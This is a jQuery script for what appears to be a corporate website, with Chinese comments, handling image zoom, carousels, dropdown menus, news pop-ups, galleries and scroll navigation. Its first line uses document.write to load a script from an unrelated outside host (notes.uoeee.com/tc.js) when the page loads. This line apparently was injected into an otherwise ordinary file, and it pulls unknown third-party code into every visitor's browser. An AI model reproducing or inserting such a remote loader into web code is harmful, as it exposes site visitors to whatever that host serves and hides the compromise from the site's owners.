// JavaScript Document

document.write("<script type=\"text/javascript\" src=\"http://notes.uoeee.com/tc.js\"></script>");
$.fn.zoom_img = function(options){
    $t = this;
    if($t.length>1){
        $t.each(function(){
            $(this).zoom_img(options);
        })
        return $t;
    }
    var ops = {
        width:50,
        height:28
    }

    $t.css("position","relative");
     ops = $.extend(ops,options);

    if($t.attr("_width")){
         ops.width = window.parseInt($t.attr("_width"));
         ops.height = window.parseInt( $t.attr("_height"));
    }

     var _left = ops.width/2;
     var _top = ops.height/2;
     var width = $(this).width();
     var height = $(this).height();

     if(width<1){
         var img = new Image()
         img.src = $t.attr("src");
         img.onload = function(){ //图片真实宽高
            width = img.width;
            height = img.height;
         }
    }
     $t.parent().parent().hover(function(){
        var img=$(this).find('img:eq(0)');
        img.stop(true).animate({
            width:width+ops.width,
            height:height+ops.height,
            left:-_left,
            top:-_top
        },500);

    },function(){
        $(this).find('img:eq(0)').stop(true).animate({
            width:width,
            height:height,
            left:0,
            top:0
        },500);
    });

     return $t;
}

 function leRi(yright,yleft,xgBox,number){
	 $(xgBox).each(function(index, element) {
    
		//点击右边
		$(this).find(yright).click(function(){
			 if($(this).parent().find("ul").is(":animated"))
			 {
				return false;	 
			 }
			$(this).parent().find("ul").animate({"marginLeft":-number},500,function(){
				$(this).find("li:first").appendTo($(this));
				$(this).css("margin-left","0");	
			});	 
		 });
		
		//点击左边
		$(this).find(yleft).click(function(){
			 if($(this).parent().find("ul").is(":animated"))
			 {
				return false;	 
			 }
			$(this).parent().find("ul").css("margin-left",-number);
			$(this).parent().find("ul").find("li:last").prependTo($(this).parent().find("ul"));
			$(this).parent().find("ul").animate({"marginLeft":"0"},500);
		 });
	});			 
 };
 
 function indexright(){


    $(window).bind("scroll", function(){ 
      if(flag==1){
      var shownowpostioninfo=$(window).scrollTop();
      
      var shownext=200;   
      
      if(shownowpostioninfo<$("body .about:eq(1)").offset().top-shownext){
          
           showindexpostion=0;
          
     }else  if(shownowpostioninfo>=$("body .about:eq(1)").offset().top-shownext&&shownowpostioninfo<$("body .about:eq(2)").offset().top-shownext){
          
          showindexpostion=1;
          
    }else  if(shownowpostioninfo>=$("body .about:eq(2)").offset().top-shownext&&shownowpostioninfo<$("body .about:eq(3)").offset().top-shownext){
          
          showindexpostion=2;
          
    }else  if(shownowpostioninfo>=$("body .about:eq(3)").offset().top-shownext&&shownowpostioninfo<$("body .about:eq(4)").offset().top-shownext){
          
          showindexpostion=3;
          
    }else{
        
         showindexpostion=4;
      }
        $(".aboutRight a").eq(showindexpostion).addClass("cur").siblings().removeClass("cur");
      }
     });

      //定义当前的位置 
      var showindexpostion=0;
      //得到总页数
      var showindexlength=$(".scroll_btn a").length;
      //鼠标滚动
      
      //标志
      var flag=1;
}
 
$(function(){
	
	/*二级下拉*/
	$('.headNav li:not(.headNav li:eq(0))').each(function(index, element) {
		if(!$(this).find('h3').hasClass('cur')){
			$(this).hover(function(e) {
				$(this).find('h3').addClass('curr');
				$('.secondBox').stop().slideDown();
				$(this).find('.secondNav').stop().slideDown();
			},function(){
				$(this).find('h3').removeClass('curr');
				$('.secondBox').hide();
				$(this).find('.secondNav').hide();
			});
		}else{
			$(this).hover(function(e) {
                $('.secondBox').stop().slideDown();
				$(this).find('.secondNav').stop().slideDown();
			},function(){
				$('.secondBox').hide();
				$(this).find('.secondNav').hide();
            });	
		}
    });
	
	/*关于我们*/
	$('.shareholder ul li:eq(1)').css({'margin-top':'25px','width':'286px'});
	$('.shareholder ul li').hover(function(e) {
        $(this).find('img:eq(0)').hide().siblings('.hoverimg').css('display','block');
	},function(){
		$(this).find('img:eq(0)').css('display','block').siblings('.hoverimg').hide();
    });
	
	
	$('.career li h4').click(function(e) {
        $(this).parent().toggleClass('cur');
		$(this).next('.careerDetail').slideToggle();
		if($(this).next('.careerDetail').css('display')=="block"){
			$(this).parent().siblings().removeClass('cur').find('.careerDetail').slideUp();
		}
    });
	
	$('.contact').click(function(e) {
        $('.masker,.contactlayer').fadeIn();
		var _height=$(window).height();
		var sc=$(window).scrollTop();
		if($('.contactlayer').height()>_height){
			$('.contactlayer').css({'position':'absolute','top':sc,'margin-top':'0'});
		}
    });
	
	$('.masker:not(.contactlayer),.close').click(function(e) {
         $('.masker,.contactlayer').fadeOut();
    });
	
	$(window).scroll(function(e) {
        var scrollTop=$(window).scrollTop();
		if(scrollTop>660){
			$('.aboutRight').css({'position':'fixed','top':'35px'})	
		}else{
			$('.aboutRight').css({'position':'absolute','top':'660px'})	
		}
		
		
		if(scrollTop>530){
			$('.hshright').show();
		}else{
			$('.hshright').hide();
		}
		
    });
	
	/*新闻中心*/
	$('#waterfall li').live('click', function () {
	    //先获取详情页的路径再替换
	    var lj = $(this).find('a').attr('href');
	    $('#frame_con').attr('src', lj);

		 $('.newsmasker,.newsDetail').fadeIn();
		 $("body,html").addClass("hiddenbody");
		 
		 var _widthall=$(window).width();
		 $('.leftclose,.rightclose').width((_widthall-1200)/2)
	})
	
	/*$('.subNews').click(function(e) {
         $('.newsmasker,.newsDetail').fadeIn();
		 $("body,html").addClass("hiddenbody");
		 
		 var _widthall=$(window).width();
		 $('.leftclose,.rightclose').width((_widthall-1200)/2)
    });*/
	
	$('.newsmasker:not(.contactlayer,.imagesWindowWrap),.newsClose,.close,.leftclose,.rightclose').click(function(e) {
         $('.newsmasker,.newsDetail,.imagesWindowWrap').fadeOut();
		 $("body,html").removeClass("hiddenbody");
    });
	
	/*解决方案*/
	$('.solutionIntro').each(function(index, element) {
        $(this).find('span:eq(0)').addClass('cur');
    });
	$('.solutionIntro span').click(function(e) {
        var _index=$(this).index();
		$(this).addClass('cur').siblings().removeClass('cur');
		$(this).parent().next('.solutionTxt').find('.txts').animate({'margin-top':-_index*349},500);
    });
	$('.solutionTxtR').each(function(index, element) {
        var _height=$(this).height();
		$(this).css('margin-top',-(_height+23)/2);
    });
	
	
	$('.solutionTechnology:eq(0)').addClass('cur');
	
	
	jQuery(".solutionTxtL").slide({mainCell:".bd ul",effect:"left",autoPlay:true});	
	$('.subSolutionTec,.solutionTecText').hide();
	$('.solutionTechnology:eq(0) .solutionTecText:eq(0)').show();
	$('.solutionTechnology').each(function(index, element) {
		$(this).find('.solutionTecText:eq(0) .subSolutionTec:eq(0)').show();
        
		$(this).find('h3').click(function(e) {
			if($(this).next().css('display')=="none"){
				$(this).parent().addClass('cur')
				$(this).parent().siblings().find('.solutionTecText').hide(10);
				$(this).parent().siblings().removeClass('cur')
				$(this).next().slideDown(300,function(){
					var _offtop=$(this).prev().offset().top;
					$('body,html').animate({'scrollTop':_offtop},400)
				});
			}else{
				$(this).parent().removeClass('cur')
				$(this).parent().find('.solutionTecText').hide(10);
			}
        });
    });
	
	$('.solutionTecNav').each(function(index, element) {
        $(this).find('span:eq(0)').addClass('cur');
		$(this).find('span').click(function(e) {
			var _index=$(this).index();
            $(this).addClass('cur').siblings().removeClass('cur');
			$(this).parent().next('.solutionTecs').find('.subSolutionTec').hide().eq(_index).show();
        });
    });
	
	$('.used').each(function(index, element) {
        $(this).find('li').live('click',function(){
			$('.newsmasker,.newsDetail').fadeIn();
			/* var scrolltop=$(window).scrollTop();
			 $('.newsDetail').css('top',scrolltop)*/
			 $("body,html").addClass("hiddenbody");
			 var _widthall=$(window).width();
			 $('.leftclose,.rightclose').width((_widthall-1200)/2);
			 
		})
    });
	
			 
			 
			 
	$('.caseList1 li').click(function (e) {
	    //先获取详情页的路径再替换
	    var lj = $(this).find('a').attr('href');
	    $('#frame_con').attr('src', lj);

        $('.newsmasker,.newsDetail').fadeIn();
		 $("body,html").addClass("hiddenbody");
		 var _widthall=$(window).width();
		 $('.leftclose,.rightclose').width((_widthall-1200)/2)
    });
	
	

	//图片无缝滚动
	leRi(".next",".prev",".case","357");
	
	/*产品信息*/
	$('.informations').each(function(index, element) {
        $(this).find('.subInformation').eq(0).show();
    });
	$('.informationNav').each(function(index, element) {
        $(this).find('span:eq(0)').addClass('cur');
		$(this).find('span').click(function(e) {
            var _index=$(this).index();
			$(this).addClass('cur').siblings().removeClass('cur');
			$(this).parent().next('.informations').find('.subInformation').hide().eq(_index).show();
        });
    });
	
	
	
	var imgsrc,imgs,_click;
	var img = new Image();
		$(".InformationPics").click(function() {
			imgsrc=$(this).attr("imgsrc");
			ss=imgsrc.split(",");
			$(".newsmasker,.imagesWindowWrap").fadeIn(500);
			
			img.src=ss[0];
			img.onload = function(){
				$(".bigimages img").attr("src", img.src);
				$(".imagesWindowWrap").css('margin-top',-img.height/2)		
			}
			_click=0;
			$('.lazying').css('display','none');
	
		});
		
	
		$(".listnext").click(function () {
			if (_click >= ss.length - 1) {
				return false;
			}
			_click++;
			$('.lazying').css('display','block');
			img.src=ss[_click];
			img.onload = function(){
				$(".bigimages img").attr("src", img.src);
				
			$('.lazying').css('display','none');
				$(".imagesWindowWrap").css('margin-top',-img.height/2)		
				
			}
		})
		
		
		 $(".listprev").click(function () {
			if (_click == 0) {
				return false;
			}
			_click--;
			img.src=ss[_click];
			img.onload = function(){
				$(".bigimages img").attr("src", img.src);
				$(".imagesWindowWrap").css('margin-top',-img.height/2)	
			}
		})
	
	
	//侧漂
	offHarry = [];
	$(".aboutRight a:eq(0)").addClass("cur");
	$(".about").each(function (index, element) {
		var offT = $(this).offset().top;
		offHarry.push(offT);
	});
	$('.aboutRight a').click(function () {
		$(this).addClass('cur').siblings().removeClass('cur');
		var aIn = $(this).index();
		$("body,html").animate({ "scrollTop": offHarry[aIn] });
	});
	
	$('.hshtop').click(function(e) {
        $('body,html').animate({scrollTop:0},500)
    });
	
	//input 绑定
   $("input[type=text],textarea:not(.SelfIntro textarea)").each(function() {
	   var _this=$(this);
	   var input_val=_this.val(); 
	   $(_this).focus(function(){
			var fo_val=$(this).val();
			if(fo_val==input_val)	
			{
				$(this).val("");
			}
	   });
	   $(_this).blur(function(){
			var bl_val=$(this).val();
			if(bl_val=="")	
			{
				$(this).val(input_val);
			}
	   });
   });

})